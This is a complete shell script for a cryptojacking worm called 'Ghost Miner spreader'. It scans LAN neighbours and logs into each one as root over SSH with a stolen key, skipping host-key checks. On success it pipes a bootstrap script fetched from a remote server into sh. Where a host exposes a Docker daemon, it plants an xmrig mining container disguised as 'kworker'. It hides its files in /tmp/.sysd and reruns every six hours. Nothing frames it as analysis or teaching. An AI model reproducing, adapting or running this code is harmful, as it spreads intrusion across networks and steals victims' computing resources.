#!/bin/sh
# ============================================================================
# Ghost Miner spreader - best effort. Finds LAN neighbours, re-uses the SAME
# staged key against them, and recurses into the bootstrap. Auto-scheduled on
# every owned host (every 6h); can also be run by hand.
# ============================================================================
set -eu

SYSDIR="${SYSDIR:-/tmp/.sysd}"
if [ -r "$SYSDIR/worker.env" ]; then . "$SYSDIR/worker.env"; fi

CONFIG_URL="${CONFIG_URL:-}"
[ -n "$CONFIG_URL" ] || { echo "spread: CONFIG_URL unset" >&2; exit 0; }
KEY="${KEY:-$SYSDIR/id_key}"                 # key staged by KEY_URL, if any
[ -r "$KEY" ] || KEY="/root/.ssh/stolen_key" # else the operator's own key
[ -r "$KEY" ] || { echo "spread: no key to spread with" >&2; exit 0; }
RIG_ID="${RIG_ID:-node}"
TARGET_USERS="${TARGET_USERS:-root}"
SEEN="$SYSDIR/spread.seen"
touch "$SEEN"

# 1) neighbours from the ARP/neigh table
ips=$( { ip neigh show 2>/dev/null; arp -an 2>/dev/null; } \
        | awk '{for(i=1;i<=NF;i++) if ($i ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/) print $i}' \
        | sort -u )

for ip in $ips; do
    case "$ip" in 127.*) continue ;; esac
    grep -qxF "$ip" "$SEEN" 2>/dev/null && continue

    # 2) same key, a few likely logins, over SSH -> remote bootstrap
    for u in $TARGET_USERS; do
        if ssh -i "$KEY" \
               -o IdentitiesOnly=yes -o BatchMode=yes \
               -o StrictHostKeyChecking=no \
               -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 \
               "$u@$ip" "curl -fsSL $CONFIG_URL/bootstrap.sh | CONFIG_URL=$CONFIG_URL sh" \
               >/dev/null 2>&1; then
            echo "spread -> $u@$ip (ssh)"
            printf '%s\n' "$ip" >> "$SEEN"
            break
        fi
    done
    grep -qxF "$ip" "$SEEN" 2>/dev/null && continue

    # 3) exposed Docker daemon -> run the miner as a container
    if curl -fs --max-time 5 "http://$ip:2375/version" >/dev/null 2>&1; then
        if docker -H "tcp://$ip:2375" run -d --restart=always --name kworker \
                "${IMAGE:-xmrig/xmrig}" \
                -o "$POOL" -u "$WALLET" -p "$RIG_ID" \
                >/dev/null 2>&1; then
            echo "spread -> $ip (docker)"
            continue
        fi
    fi

    # 4) :445 SMB is best effort - needs smbclient/mount + a way to execute,
    #    or simply: ssh in with credentials harvested elsewhere.
    echo "spread -> $ip (skip: no ssh/docker path)"
done
